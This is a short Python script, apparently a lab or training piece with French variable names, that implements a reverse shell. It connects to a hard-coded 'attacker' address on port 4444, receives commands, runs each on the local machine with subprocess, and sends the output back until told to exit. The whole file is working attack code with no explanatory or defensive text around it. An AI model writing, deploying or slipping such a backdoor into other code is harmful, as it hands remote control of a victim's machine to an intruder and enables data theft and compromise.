import socket
import subprocess

IP_ATTAQUANT = '192.168.153.128' 
PORT = 4444

client = socket.socket()
client.connect((IP_ATTAQUANT, PORT))

while True:
    commande = client.recv(1024).decode()
    
    if commande.lower() == "exit":
        break

    try:
        resultat = subprocess.getoutput(commande)
    except Exception as e:
        resultat = str(e)

    client.send(resultat.encode())

client.close()